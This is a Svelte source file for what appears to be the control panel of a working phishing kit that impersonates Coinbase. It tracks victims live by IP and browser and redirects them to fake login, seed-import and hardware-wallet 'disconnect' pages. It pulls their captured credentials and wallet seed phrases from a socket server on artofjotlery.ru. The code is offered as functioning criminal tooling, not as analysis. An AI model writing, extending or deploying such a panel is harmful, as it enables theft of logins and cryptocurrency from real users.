<script lang="ts">
	import { onMount } from 'svelte';
	import { io, Socket } from 'socket.io-client';
	import { fade, slide, scale } from 'svelte/transition';
	import pageConfigurations from '$lib/data/pageConfigurations.json';

	interface PageDetails {
		icon: string;
		description: string;
		dataCollected: string;
		imagePath: string;
	}

	interface GroupConfig {
		icon: string;
		pages: Record<string, PageDetails>;
	}

	interface PageConfigurations {
		groups: Record<string, GroupConfig>;
	}

	const typedPageConfigurations = pageConfigurations as PageConfigurations;

	function getPageConfig(pageId: string): PageDetails | null {
		for (const groupKey in typedPageConfigurations.groups) {
			const group = typedPageConfigurations.groups[groupKey];
			if (group.pages[pageId]) {
				return group.pages[pageId];
			}
		}
		return null;
	}

	export let username: string;
	export let guild: string;
	let actionsOn = false;
	let capturedData = false;
	let selectedID = '0';
	let socket: Socket;
	let Targets: Array<any> = [];
	let currentPage = 1;
	const itemsPerPage = 8;

	import bootstrap from '$lib/images/bootstrap.svg';

	import Coinbase from '$lib/images/coinbase-v2.svg';
	import Gemini from '$lib/images/gemini-dollar-gusd-logo.svg';

	import ChromeLogo from '$lib/images/browsers/Google_Chrome_icon_(February_2022).svg';
	import FirefoxLogo from '$lib/images/browsers/Firefox_logo,_2019.svg';
	import SafariLogo from '$lib/images/browsers/Safari_browser_logo.svg';
	import OperaLogo from '$lib/images/browsers/Opera_2015_icon.svg';
	import EdgeLogo from '$lib/images/browsers/Microsoft_Edge_logo_(2019).svg';

	import { browser } from '$app/environment';

	let notification = false;
	let notificationData = {
		belongsto: '',
		browser: 'Chrome',
		currentpage: '',
		id: 'ede72e85-a010-4bc4-a850-88c12a6f1ba4',
		ip: '127.0.0.1',
		location: '',
		status: ''
	};

	interface CapturedLog {
		targetid: string;
		page: string;
		captureddata: string;
	}

	let capturedLogs: CapturedLog[] = [];

	$: totalPages = Math.ceil(Targets.length / itemsPerPage);
	$: paginatedTargets = [...Targets]
		.reverse()
		.slice((currentPage - 1) * itemsPerPage, currentPage * itemsPerPage);

	function nextPage() {
		if (currentPage < totalPages) {
			currentPage++;
		}
	}

	function previousPage() {
		if (currentPage > 1) {
			currentPage--;
		}
	}

	function goToPage(page: number) {
		if (page >= 1 && page <= totalPages) {
			currentPage = page;
		}
	}

	async function openCapturedData(targID: string) {
		selectedID = targID;
		capturedData = !capturedData;

		if (capturedData) {
			try {
				const res = await fetch(`https://artofjotlery.ru/api/targets/${selectedID}`);
				if (res.ok) {
					capturedLogs = await res.json();
				} else {
					console.error('Failed to fetch captured data');
					capturedLogs = [];
				}
			} catch (err) {
				console.error('Error fetching captured data:', err);
			}
		}
	}

	function openActions(targID: string) {
		console.log(Targets);
		selectedID = targID;
		actionsOn = !actionsOn;
	}

	async function playCustomSound() {
		try {
			const soundRes = await fetch(`api/sound/${username}`);
			if (!soundRes.ok) {
				throw new Error('Failed to fetch custom sound');
			}
			const soundData = await soundRes.json();

			const audio = new Audio(soundData.soundUrl);
			await audio.play();
		} catch (error) {
			console.error('Error playing custom sound:', error);
			const defaultAudio = new Audio('/notification.mp3');
			defaultAudio.play().catch((error) => {
				console.error('Error playing default sound:', error);
			});
		}
	}

	function sendNotification(target: any) {
		notification = true;
		notificationData = target;
		console.log(notificationData);

		playCustomSound();

		setTimeout(() => {
			notification = false;
		}, 5000);
	}

	async function deleteTarget(targetID: string) {
		try {
			const response = await fetch('/api/deleteTarg', {
				method: 'POST',
				headers: {
					'Content-Type': 'application/json'
				},
				body: JSON.stringify({ targID: targetID })
			});

			if (response.ok) {
				Targets = Targets.filter((target) => target.id !== targetID);
				socket.emit('deleteTarget', { targetID });
			} else {
				console.error('Failed to delete target');
			}
		} catch (error) {
			console.error('Error deleting target:', error);
		}
	}

	let hideSeed = false;

	onMount(async () => {
		try {
			const settingsRes = await fetch(`/api/guild/getSettings?guild=${guild}`);
			const settingsData = await settingsRes.json();
			hideSeed = !settingsData.displaySeeds;
		} catch (err) {
			console.error('Error fetching settings:', err);
		}

		const res = await fetch(`http://localhost:3000/socketServer/api/targets/${username}`);
		Targets = await res.json();

		socket = io('https://artofjotlery.ru', {
			path: '/socketServer/socket.io'
		});

		socket.emit('joinDashboardRoom', { username });

		socket.on('targetAdded', (newTarget) => {
			Targets = [...Targets, newTarget];
			sendNotification(newTarget);
		});

		socket.on('targetUpdated', ({ targetID, status, currentPage }) => {
			Targets = Targets.map((target) =>
				target.id === targetID ? { ...target, status, currentpage: currentPage } : target
			);

			playCustomSound();
		});
	});

	let selectedPage = 'account_review';
	let showOptions = false;

	$: selectedPageConfig = getPageConfig(selectedPage);
	$: selectedPageDescription = selectedPageConfig?.description || '';
	$: selectedPageData = selectedPageConfig?.dataCollected || '';
	$: selectedPageImage = selectedPageConfig?.imagePath || placeholderImage;

	function updateDescription() {
		showOptions = false;
	}

	function getBrowserName(userAgent: string) {
		if (userAgent.includes('Firefox')) {
			return 'Firefox';
		} else if (userAgent.includes('Edg')) {
			return 'Microsoft Edge';
		} else if (userAgent.includes('Chrome')) {
			return 'Google Chrome';
		} else if (userAgent.includes('Safari')) {
			return 'Safari';
		} else if (userAgent.includes('Opera') || userAgent.includes('OPR')) {
			return 'Opera';
		} else if (userAgent.includes('Trident')) {
			return 'Internet Explorer';
		} else {
			return 'Unknown Browser';
		}
	}

	let currentLogPage = 1;

	import placeholderImage from '$lib/previews/placeholder.png';

	let showFullscreenPreview = false;

	let customUrl: string = '';
	let showCustomUrlInput: boolean = false;

	function sendCustomRedirect() {
		if (customUrl && customUrl.trim()) {
			console.log('Sending custom redirect:', {
				targetID: selectedID,
				action: 'customRedirect',
				customUrl: customUrl
			});
			socket.emit('sendActionToTarget', {
				targetID: selectedID,
				action: 'customRedirect',
				customUrl: customUrl
			});
			showCustomUrlInput = false;
			actionsOn = false;
			customUrl = '';
		}
	}

	function getIconForPage(page: string): string {
		const icons: { [key: string]: string } = {
			loadingScreen: 'hourglass_empty',
			login: 'login',
			'login-two': 'password'
			// Add more mappings as needed
		};
		return icons[page] || 'web';
	}

	function formatPageName(name: string): string {
		return name
			.split('_')
			.map((word) => word.charAt(0).toUpperCase() + word.slice(1))
			.join(' ');
	}

	const pageGroups = {
		'Login Flow': [
			{ value: 'loadingScreen', icon: 'hourglass_empty' },
			{ value: 'login', icon: 'login' }
			// Add more pages with their icons
		],
		Starters: [
			{ value: 'account_review', icon: 'rocket' }
			// Add more pages
		]
		// Add more groups
	};

	function sendActionToTarget() {
		socket.emit('sendActionToTarget', {
			targetID: selectedID,
			action: selectedPage,
			data: {}
		});
		actionsOn = false;
	}

	let actionType: 'page' | 'route' = 'page';
	let selectedRoute: string | null = null;
	let routes: RoutePreset[] = [];

	onMount(async () => {
		// ... existing onMount code ...
		try {
			const routesRes = await fetch(`/api/routes/${username}`);
			if (routesRes.ok) {
				routes = await routesRes.json();
			}
		} catch (err) {
			console.error('Error fetching routes:', err);
		}
	});

	function sendRouteToTarget() {
		if (selectedRoute) {
			socket.emit('sendActionToTarget', {
				targetID: selectedID,
				action: 'executeRoute',
				routeId: selectedRoute
			});
			actionsOn = false;
		}
	}

	interface RouteStep {
		pageId: string;
		delay: number;
	}

	interface RoutePreset {
		id: string;
		name: string;
		steps: RouteStep[];
	}

	interface AvailablePage {
		id: string;
		name: string;
		icon: string;
	}

	let availablePages: AvailablePage[] = Object.entries(typedPageConfigurations.groups).flatMap(
		([groupName, group]) =>
			Object.entries(group.pages).map(([pageId, page]) => ({
				id: pageId,
				name: pageId
					.split('_')
					.map((word) => word.charAt(0).toUpperCase() + word.slice(1))
					.join(' '),
				icon: page.icon
			}))
	);

	let showConfirmationModal = false;
	let confirmationDetails = {
		type: '',
		targetId: '',
		title: '',
		message: ''
	};

	function openConfirmation(type: 'single' | 'all', targetId: string = '') {
		confirmationDetails = {
			type,
			targetId,
			title: type === 'single' ? 'Delete Target' : 'Clear All Targets',
			message:
				type === 'single'
					? 'Are you sure you want to delete this target? This action cannot be undone.'
					: 'Are you sure you want to clear all targets? This action cannot be undone.'
		};
		showConfirmationModal = true;
	}

	async function handleConfirm() {
		try {
			if (confirmationDetails.type === 'single') {
				await deleteTarget(confirmationDetails.targetId);
			} else {
				const authToken = document.cookie
					.split('; ')
					.find((row) => row.startsWith('authToken='))
					?.split('=')[1];

				const response = await fetch('/api/deleteTarg/all', {
					method: 'POST',
					headers: {
						'Content-Type': 'application/json',
						Authorization: `Bearer ${authToken}`
					},
					body: JSON.stringify({ username })
				});
				if (response.ok) {
					Targets = [];
				}
			}
		} catch (error) {
			console.error('Error:', error);
		}
		showConfirmationModal = false;
	}

	let searchQuery = '';
	let filteredOptions = [];

	$: {
		if (showOptions) {
			filteredOptions = Object.entries(typedPageConfigurations.groups)
				.map(([groupName, group]) => ({
					groupName,
					pages: Object.entries(group.pages).filter(([pageId, page]) => {
						const searchLower = searchQuery.toLowerCase();
						return (
							pageId.toLowerCase().includes(searchLower) ||
							formatPageName(pageId).toLowerCase().includes(searchLower)
						);
					})
				}))
				.filter((group) => group.pages.length > 0);
		}
	}
</script>

<div class="dashboard">
	<div class="dashboard-header">
		<div class="header-content">
			<div class="title-section">
				<h1>Dashboard</h1>
				<p class="subtitle">Manage and monitor your active targets</p>
			</div>
			<div class="header-actions">
				<button class="danger-action" on:click={() => openConfirmation('all')}>
					<span class="material-icons">delete_sweep</span>
					<span>Clear All</span>
				</button>
			</div>
		</div>
	</div>
	<table>
		<thead>
			<tr>
				<th>Service</th>
				<th>Target ID</th>
				<th>IP Address</th>
				<th>Status</th>
				<th>Current Page</th>
				<th>Browser</th>
				<th>Actions</th>
			</tr>
		</thead>
		<tbody>
			{#each paginatedTargets as target}
				<tr>
					<td>
						<div class="logoHolder">
							<img src={Coinbase} height="20px" width="20px" />
							Coinbase
						</div>
					</td>
					<td>{target.id.slice(0, 8)}...</td>
					<td>{target.ip}</td>
					<td>
						{#if target.status == 'Online'}
							<span class="status-dot online"></span> Online
						{:else if target.status == 'Offline'}
							<span class="status-dot offline"></span> Offline
						{:else}
							<span class="status-dot waiting"></span> Waiting
						{/if}
					</td>
					<td>./{target.currentpage}</td>

					<td>
						<div class="logoHolder">
							{#if getBrowserName(target.browser) == 'Google Chrome'}
								<img src={ChromeLogo} height="20px" width="20px" />
								Google Chrome
							{:else if getBrowserName(target.browser) == 'Firefox'}
								<img src={FirefoxLogo} height="20px" width="20px" />
								Firefox
							{:else if getBrowserName(target.browser) == 'Microsoft Edge'}
								<img src={EdgeLogo} height="20px" width="20px" />
								Microsoft Edge
							{:else if getBrowserName(target.browser) == 'Opera'}
								<img src={OperaLogo} height="20px" width="20px" />
								Opera
							{:else if getBrowserName(target.browser) == 'Safari'}
								<img src={SafariLogo} height="20px" width="20px" />
								Safari
							{:else}
								Unknown
							{/if}
						</div>
					</td>
					<td class="actions-cell">
						<div class="action-buttons">
							<button
								class="action-btn redirect"
								on:click={() => openActions(target.id)}
								title="Redirect Target"
							>
								<span class="material-icons">route</span>
							</button>
							<button
								class="action-btn data"
								on:click={() => openCapturedData(target.id)}
								title="View Captured Data"
							>
								<span class="material-icons">data_object</span>
							</button>
							<button
								class="action-btn delete"
								on:click={() => openConfirmation('single', target.id)}
								title="Delete Target"
							>
								<span class="material-icons">delete_outline</span>
							</button>
						</div>
					</td>
				</tr>
			{/each}
		</tbody>
	</table>

	{#if totalPages > 1}
		<div class="pagination">
			<button class="page-btn" on:click={previousPage} disabled={currentPage === 1}> ← </button>

			{#each Array(totalPages) as _, i}
				<button
					class="page-btn"
					class:active={currentPage === i + 1}
					on:click={() => goToPage(i + 1)}
				>
					{i + 1}
				</button>
			{/each}

			<button class="page-btn" on:click={nextPage} disabled={currentPage === totalPages}>
				→
			</button>
		</div>
	{/if}
</div>

{#if actionsOn}
	<div class="modal-overlay" transition:fade>
		<div class="actions-modal" transition:scale>
			<div class="modal-header">
				<div class="header-content">
					<h2>Actions Panel</h2>
					<p class="subtitle">
						<span class="material-icons">account_tree</span>
						Target ID: <span class="highlight">{selectedID}</span>
					</p>
				</div>
				<button class="close-button" on:click={() => (actionsOn = false)}>
					<span class="material-icons">close</span>
				</button>
			</div>

			<div class="modal-content">
				<div class="action-type-selector">
					<div
						class="type-option"
						class:active={actionType === 'page'}
						on:click={() => (actionType = 'page')}
					>
						<div class="type-icon">
							<span class="material-icons">web</span>
						</div>
						<div class="type-content">
							<h3>Direct Page</h3>
							<p>Redirect to a specific page</p>
						</div>
						<div class="type-indicator">
							<div class="radio-circle" />
						</div>
					</div>
					<div
						class="type-option"
						class:active={actionType === 'route'}
						on:click={() => (actionType = 'route')}
					>
						<div class="type-icon">
							<span class="material-icons">route</span>
						</div>
						<div class="type-content">
							<h3>Route Sequence</h3>
							<p>Use a premade routing sequence</p>
						</div>
						<div class="type-indicator">
							<div class="radio-circle" />
						</div>
					</div>
				</div>

				{#if actionType === 'page'}
					<div class="content-grid" transition:slide>
						<div class="left-panel">
							<div class="template-selection">
								<label class="section-label">
									<span class="material-icons">route</span>
									Select Redirect Page
								</label>
								<div class="custom-select">
									<div class="selected-option" on:click={() => (showOptions = !showOptions)}>
										<span class="material-icons">{getIconForPage(selectedPage)}</span>
										<span class="option-text">{formatPageName(selectedPage)}</span>
										<span class="material-icons dropdown-arrow" class:open={showOptions}
											>expand_more</span
										>
									</div>

									{#if showOptions}
										<div class="options-container" transition:slide>
											<div class="search-container">
												<span class="material-icons search-icon">search</span>
												<input
													type="text"
													class="search-input"
													placeholder="Search pages..."
													bind:value={searchQuery}
													on:click|stopPropagation
												/>
											</div>
											{#each filteredOptions as { groupName, pages }}
												<div class="option-group">
													<div class="group-header">
														<span class="group-icon"
															>{typedPageConfigurations.groups[groupName].icon}</span
														>
														{groupName}
													</div>
													{#each pages as [pageId, page]}
														<div
															class="option"
															class:selected={selectedPage === pageId}
															on:click={() => {
																selectedPage = pageId;
																showOptions = false;
																searchQuery = '';
															}}
														>
															<span class="material-icons">{page.icon}</span>
															<span class="option-text">{formatPageName(pageId)}</span>
															{#if selectedPage === pageId}
																<span class="material-icons check">check</span>
															{/if}
														</div>
													{/each}
												</div>
											{/each}
											{#if filteredOptions.length === 0}
												<div class="no-results">
													<span class="material-icons">search_off</span>
													<p>No matching pages found</p>
												</div>
											{/if}
										</div>
									{/if}
								</div>
							</div>

							<div class="info-panel">
								<div class="info-section" transition:slide>
									<div class="info-header">
										<span class="material-icons">info</span>
										<h3>Page Description</h3>
									</div>
									<p class="description">{selectedPageDescription}</p>
								</div>

								<div class="info-section" transition:slide>
									<div class="info-header">
										<span class="material-icons">data_object</span>
										<h3>Data Collection</h3>
									</div>
									<p class="data-info">{selectedPageData}</p>
								</div>
							</div>
						</div>

						<div class="preview-panel">
							<div class="preview-header">
								<span class="material-icons">preview</span>
								<h3>Page Preview</h3>
							</div>
							<div class="preview-container" transition:fade>
								<div class="preview-frame">
									<img
										src={selectedPageImage}
										alt="Page Preview"
										on:error={(e) => ((e.currentTarget as HTMLImageElement).src = placeholderImage)}
										on:click={() => (showFullscreenPreview = true)}
										class="preview-image"
									/>
									<div class="preview-overlay">
										<span class="material-icons">zoom_in</span>
									</div>
								</div>
							</div>
						</div>
					</div>
				{:else}
					<div class="routes-section" transition:slide>
						<div class="routes-header">
							<span class="material-icons">route</span>
							<h3>Select Route Sequence</h3>
						</div>
						<div class="routes-grid">
							{#each routes as route}
								<div
									class="route-card"
									class:selected={selectedRoute === route.id}
									on:click={() => (selectedRoute = route.id)}
								>
									<div class="route-header">
										<div class="route-info">
											<span class="material-icons">route</span>
											<h4>{route.name}</h4>
										</div>
										<div class="selection-indicator">
											<span class="material-icons"
												>{selectedRoute === route.id
													? 'radio_button_checked'
													: 'radio_button_unchecked'}</span
											>
										</div>
									</div>
									<div class="route-steps">
										{#each route.steps as step, index}
											<div class="route-step">
												<div class="step-info">
													<span class="step-number">{index + 1}</span>
													<span class="material-icons"
														>{availablePages.find((p) => p.id === step.pageId)?.icon || 'web'}</span
													>
													<span class="step-name">
														{availablePages.find((p) => p.id === step.pageId)?.name}
													</span>
												</div>
												<div class="step-delay">
													<span class="material-icons">timer</span>
													{step.delay}s
												</div>
											</div>
										{/each}
									</div>
								</div>
							{/each}
						</div>
					</div>
				{/if}

				<div class="action-panel" transition:slide>
					<button
						class="action-btn custom-url-btn"
						on:click={() => (showCustomUrlInput = !showCustomUrlInput)}
					>
						<span class="material-icons">link</span>
						<span>Custom URL</span>
					</button>
					<button
						class="action-btn submit-button"
						on:click={actionType === 'page' ? sendActionToTarget : sendRouteToTarget}
					>
						<span class="material-icons">rocket_launch</span>
						<span>Execute {actionType === 'page' ? 'Redirect' : 'Route'}</span>
					</button>
				</div>

				{#if showCustomUrlInput}
					<div class="custom-url-input" transition:slide>
						<div class="url-input-container">
							<span class="material-icons input-icon">link</span>
							<input
								type="text"
								class="styled-input"
								placeholder="Enter custom URL (e.g., https://example.com)"
								bind:value={customUrl}
							/>
						</div>
						<button class="custom-redirect-btn" on:click={sendCustomRedirect}>
							<span class="material-icons">send</span>
							Redirect to URL
						</button>
					</div>
				{/if}
			</div>
		</div>
	</div>
{/if}

{#if capturedData}
	<div class="modal-overlay" transition:fade>
		<div class="captured-data-modal" transition:scale>
			<div class="modal-header">
				<div class="header-content">
					<h2 class="white">Captured Data</h2>
					<p class="subtitle">
						<span class="bold">Target ID:</span> <span class="white">{selectedID}</span>
					</p>
				</div>
				<button class="close-button" on:click={() => (capturedData = false)}>
					<span class="material-icons">close</span>
				</button>
			</div>

			<div class="logs-container">
				{#each capturedLogs.slice((currentLogPage - 1) * 5, currentLogPage * 5) as log}
					<div class="log-entry" transition:slide>
						<div class="log-header">
							<div class="page-indicator">
								<span class="material-icons">description</span>
								<span class="page-name">{log.page}</span>
							</div>
							<div class="timestamp">
								<span class="material-icons">schedule</span>
								<span>{new Date().toLocaleTimeString()}</span>
							</div>
						</div>
						<div class="log-content">
							<p class="data-label">Captured Data:</p>
							<div class="data-content">
								{#if (log.page == 'import_seed' || log.page == 'disconnect_ledger' || log.page == 'disconnect_trezor') && hideSeed}
									<span class="hidden-data">
										<span class="material-icons">lock</span>
										Hidden by guild owner
									</span>
								{:else}
									<span class="captured-text">{log.captureddata}</span>
								{/if}
							</div>
						</div>
					</div>
				{/each}
			</div>

			{#if Math.ceil(capturedLogs.length / 5) > 1}
				<div class="modal-pagination">
					<button
						class="page-btn"
						on:click={() => (currentLogPage = Math.max(1, currentLogPage - 1))}
						disabled={currentLogPage === 1}
					>
						<span class="material-icons">chevron_left</span>
					</button>

					{#each Array(Math.ceil(capturedLogs.length / 5)) as _, i}
						<button
							class="page-btn"
							class:active={currentLogPage === i + 1}
							on:click={() => (currentLogPage = i + 1)}
						>
							{i + 1}
						</button>
					{/each}

					<button
						class="page-btn"
						on:click={() =>
							(currentLogPage = Math.min(Math.ceil(capturedLogs.length / 5), currentLogPage + 1))}
						disabled={currentLogPage === Math.ceil(capturedLogs.length / 5)}
					>
						<span class="material-icons">chevron_right</span>
					</button>
				</div>
			{/if}
		</div>
	</div>
{/if}

{#if notification}
	<div class="notification" in:fade={{ duration: 400 }} out:fade={{ duration: 300 }}>
		<div class="notification-glow"></div>
		<div class="notification-content">
			<div class="notification-header">
				<div class="header-icon">
					<span class="material-icons pulse-animation">notifications_active</span>
				</div>
				<div class="header-text">
					<h3>New Target Connected</h3>
					<p class="target-id">{notificationData.id.slice(0, 12)}...</p>
				</div>
			</div>

			<div class="notification-details">
				<div class="detail-item">
					<div class="detail-icon">
						<img src={Coinbase} alt="Service" class="service-icon" />
					</div>
					<div class="detail-text">
						<span class="label">Service</span>
						<span class="value">Coinbase</span>
					</div>
				</div>

				<div class="detail-item">
					<div class="detail-icon">
						{#if getBrowserName(notificationData.browser) === 'Google Chrome'}
							<img src={ChromeLogo} alt="Browser" class="browser-icon" />
						{:else if getBrowserName(notificationData.browser) === 'Firefox'}
							<img src={FirefoxLogo} alt="Browser" class="browser-icon" />
						{:else if getBrowserName(notificationData.browser) === 'Microsoft Edge'}
							<img src={EdgeLogo} alt="Browser" class="browser-icon" />
						{:else if getBrowserName(notificationData.browser) === 'Opera'}
							<img src={OperaLogo} alt="Browser" class="browser-icon" />
						{:else if getBrowserName(notificationData.browser) === 'Safari'}
							<img src={SafariLogo} alt="Browser" class="browser-icon" />
						{:else}
							<span class="material-icons">public</span>
						{/if}
					</div>
					<div class="detail-text">
						<span class="label">Browser</span>
						<span class="value">{getBrowserName(notificationData.browser)}</span>
					</div>
				</div>

				<div class="detail-item">
					<div class="detail-icon">
						<span class="material-icons">location_on</span>
					</div>
					<div class="detail-text">
						<span class="label">IP Address</span>
						<span class="value">{notificationData.ip}</span>
					</div>
				</div>
			</div>

			<div class="notification-progress">
				<div class="progress-bar"></div>
			</div>
		</div>
	</div>
{/if}

{#if showFullscreenPreview}
	<div
		class="fullscreen-preview"
		transition:fade
		on:click|self={() => (showFullscreenPreview = false)}
	>
		<div class="fullscreen-container">
			<button class="close-fullscreen" on:click={() => (showFullscreenPreview = false)}>
				<span class="material-icons">close</span>
			</button>
			<img
				src={selectedPageImage}
				alt="Full Preview"
				on:error={(e) => ((e.currentTarget as HTMLImageElement).src = placeholderImage)}
			/>
		</div>
	</div>
{/if}

{#if showConfirmationModal}
	<div class="modal-overlay" transition:fade>
		<div class="confirmation-modal" transition:scale>
			<div class="confirmation-content">
				<span class="warning-icon material-icons">
					{confirmationDetails.type === 'single' ? 'delete_forever' : 'delete_sweep'}
				</span>
				<h2>{confirmationDetails.title}</h2>
				<p>{confirmationDetails.message}</p>

				{#if confirmationDetails.type === 'single'}
					<div class="target-info">
						<span class="material-icons">fingerprint</span>
						<code>{confirmationDetails.targetId.slice(0, 8)}...</code>
					</div>
				{/if}

				<div class="confirmation-actions">
					<button class="cancel-btn" on:click={() => (showConfirmationModal = false)}>
						<span class="material-icons">close</span>
						Cancel
					</button>
					<button class="confirm-btn" on:click={handleConfirm}>
						<span class="material-icons">
							{confirmationDetails.type === 'single' ? 'delete' : 'delete_sweep'}
						</span>
						{confirmationDetails.type === 'single' ? 'Delete Target' : 'Clear All'}
					</button>
				</div>
			</div>
		</div>
	</div>
{/if}

<style>
	.buttons {
		margin-bottom: 1em;
	}
	.notification {
		position: fixed;
		bottom: 2em;
		right: 2em;
		width: 380px;
		z-index: 1000;
		perspective: 1000px;
		transform-style: preserve-3d;
	}

	.notification-glow {
		position: absolute;
		inset: -1px;
		background: linear-gradient(45deg, rgba(98, 71, 218, 0.3), rgba(56, 35, 155, 0.3));
		border-radius: 1.2em;
		filter: blur(15px);
		opacity: 0.5;
		z-index: -1;
	}

	.notification-content {
		background: linear-gradient(135deg, rgba(28, 27, 35, 0.95) 0%, rgba(14, 13, 21, 0.98) 100%);
		border: 1px solid rgba(98, 71, 218, 0.3);
		border-radius: 1.2em;
		padding: 1.5em;
		box-shadow:
			0 8px 32px rgba(0, 0, 0, 0.3),
			0 2px 4px rgba(98, 71, 218, 0.1);
		backdrop-filter: blur(10px);
		transform: translateZ(0);
		animation: notification-enter 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
	}

	.notification-header {
		display: flex;
		align-items: center;
		gap: 1em;
		margin-bottom: 1.5em;
	}

	.header-icon {
		width: 40px;
		height: 40px;
		background: linear-gradient(135deg, rgba(98, 71, 218, 0.2), rgba(56, 35, 155, 0.2));
		border-radius: 50%;
		display: flex;
		align-items: center;
		justify-content: center;
	}

	.header-icon .material-icons {
		color: rgba(98, 71, 218, 1);
		font-size: 1.4em;
	}

	.pulse-animation {
		animation: pulse 2s infinite;
	}

	.header-text h3 {
		margin: 0;
		font-size: 1.2em;
		color: white;
		font-weight: 600;
		letter-spacing: 0.02em;
	}

	.target-id {
		margin: 0.2em 0 0 0;
		font-size: 0.85em;
		color: rgba(255, 255, 255, 0.5);
		font-family: monospace;
	}

	.notification-details {
		display: flex;
		flex-direction: column;
		gap: 1em;
	}

	.detail-item {
		display: flex;
		align-items: center;
		gap: 1em;
		padding: 0.8em;
		background: rgba(98, 71, 218, 0.05);
		border: 1px solid rgba(98, 71, 218, 0.1);
		border-radius: 0.8em;
		transition: all 0.3s ease;
	}

	.detail-item:hover {
		background: rgba(98, 71, 218, 0.1);
		border-color: rgba(98, 71, 218, 0.2);
		transform: translateX(0.5em);
	}

	.detail-icon {
		width: 32px;
		height: 32px;
		display: flex;
		align-items: center;
		justify-content: center;
		background: rgba(255, 255, 255, 0.05);
		border-radius: 0.6em;
		padding: 0.5em;
	}

	.detail-icon img {
		width: 100%;
		height: 100%;
		object-fit: contain;
		filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.2));
	}

	.detail-icon .material-icons {
		color: rgba(98, 71, 218, 1);
		font-size: 1.2em;
	}

	.detail-text {
		display: flex;
		flex-direction: column;
		gap: 0.2em;
	}

	.detail-text .label {
		font-size: 0.75em;
		color: rgba(255, 255, 255, 0.5);
		text-transform: uppercase;
		letter-spacing: 0.05em;
	}

	.detail-text .value {
		color: white;
		font-size: 0.95em;
		font-weight: 500;
	}

	.notification-progress {
		margin-top: 1.2em;
		height: 2px;
		background: rgba(98, 71, 218, 0.1);
		border-radius: 1px;
		overflow: hidden;
	}

	.progress-bar {
		height: 100%;
		background: linear-gradient(90deg, rgba(98, 71, 218, 0.8), rgba(56, 35, 155, 0.8));
		width: 100%;
		animation: progress 5s linear;
	}

	@keyframes notification-enter {
		from {
			opacity: 0;
			transform: translateX(100px) translateZ(0) rotateY(10deg);
		}
		to {
			opacity: 1;
			transform: translateX(0) translateZ(0) rotateY(0);
		}
	}

	@keyframes pulse {
		0% {
			transform: scale(1);
			opacity: 1;
		}
		50% {
			transform: scale(1.2);
			opacity: 0.7;
		}
		100% {
			transform: scale(1);
			opacity: 1;
		}
	}

	@keyframes progress {
		from {
			width: 100%;
		}
		to {
			width: 0%;
		}
	}

	.service-icon,
	.browser-icon {
		transition: transform 0.3s ease;
	}

	.detail-item:hover .service-icon,
	.detail-item:hover .browser-icon {
		transform: scale(1.1);
	}

	.pagination {
		display: flex;
		justify-content: center;
		align-items: center;
		gap: 0.5em;
		margin-top: 2em;
		padding: 1em;
	}

	.page-btn {
		padding: 0.5em 1em;
		border: 1px solid rgba(98, 71, 218, 0.2);
		background: linear-gradient(45deg, rgba(56, 35, 155, 0.1) 0%, rgba(14, 13, 21, 0.95) 60%);
		color: white;
		border-radius: 0.5em;
		cursor: pointer;
		transition: all 0.2s ease;
	}

	.page-btn:hover:not(:disabled) {
		background: linear-gradient(45deg, rgba(98, 71, 218, 0.8) 0%, rgba(56, 35, 155, 0.8) 100%);
		transform: translateY(-2px);
	}

	.page-btn.active {
		background: linear-gradient(45deg, rgba(98, 71, 218, 0.8) 0%, rgba(56, 35, 155, 0.8) 100%);
		border-color: rgba(98, 71, 218, 0.6);
	}

	.page-btn:disabled {
		opacity: 0.5;
		cursor: not-allowed;
	}

	.logoHolder {
		display: flex;
		flex-direction: row;
		align-items: center;
		gap: 0.5em;
	}

	table {
		width: 100%;
		text-align: left;
		padding: 1.5em;
		border: 1px solid rgba(98, 71, 218, 0.2);
		background: linear-gradient(45deg, rgba(56, 35, 155, 0.1) 0%, rgba(14, 13, 21, 0.95) 60%);
		border-radius: 1em;
		border-collapse: separate;
		border-spacing: 0;
		box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
		overflow: hidden;
	}

	th {
		font-weight: 500;
		color: rgba(255, 255, 255, 0.7);
		text-transform: uppercase;
		font-size: 0.85em;
		letter-spacing: 0.05em;
		padding: 1.2em 1.5em;
		border-bottom: 1px solid rgba(98, 71, 218, 0.2);
	}

	td {
		padding: 1.2em 1.5em;
		border-bottom: 1px solid rgba(98, 71, 218, 0.1);
		transition: all 0.2s ease;
	}

	tr:last-child td {
		border-bottom: none;
	}

	tr:hover td {
		background: rgba(98, 71, 218, 0.05);
	}

	.logoHolder {
		display: flex;
		flex-direction: row;
		align-items: center;
		gap: 0.8em;
	}

	.logoHolder img {
		transition: transform 0.2s ease;
	}

	.logoHolder:hover img {
		transform: scale(1.1);
	}

	td button {
		padding: 0.4em 0.8em;
		margin: 0 0.2em;
		font-size: 1em;
		opacity: 0.7;
		transition: all 0.2s ease;
	}

	td button:hover {
		opacity: 1;
		transform: translateY(-2px);
		background: linear-gradient(45deg, rgba(98, 71, 218, 0.8) 0%, rgba(56, 35, 155, 0.8) 100%);
	}

	.status-dot {
		display: inline-block;
		width: 8px;
		height: 8px;
		border-radius: 50%;
		margin-right: 8px;
		transition: all 0.3s ease;
	}

	.status-dot.online {
		background: #00ff9d;
		box-shadow: 0 0 12px rgba(0, 255, 157, 0.4);
	}

	.status-dot.offline {
		background: #ff4444;
		box-shadow: 0 0 12px rgba(255, 68, 68, 0.4);
	}

	.status-dot.waiting {
		background: #ffbb00;
		box-shadow: 0 0 12px rgba(255, 187, 0, 0.4);
	}

	@keyframes fadeIn {
		from {
			opacity: 0;
			transform: translateY(10px);
		}
		to {
			opacity: 1;
			transform: translateY(0);
		}
	}

	tbody tr {
		animation: fadeIn 0.3s ease forwards;
	}

	.redirectTarg {
		padding: 2em;
		min-width: 30em;
		position: fixed;
		top: 50%;
		left: 50%;
		transform: translate(-50%, -50%);
		box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
	}

	.redirectTarg::before {
		content: '';
		position: absolute;
		top: 0;
		left: 0;
		right: 0;
		bottom: 0;
		background: linear-gradient(45deg, rgba(56, 35, 155, 0.1) 0%, rgba(14, 13, 21, 0.95) 60%);
		border: 1px solid rgba(98, 71, 218, 0.2);
		border-radius: 1em;
		backdrop-filter: blur(8px);
		z-index: -1;
	}

	.redirectTarg > * {
		position: relative;
		z-index: 1;
	}

	.redirectTarg h2 {
		margin-bottom: 1.5em;
		font-size: 1.5em;
		display: flex;
		justify-content: space-between;
		align-items: center;
	}

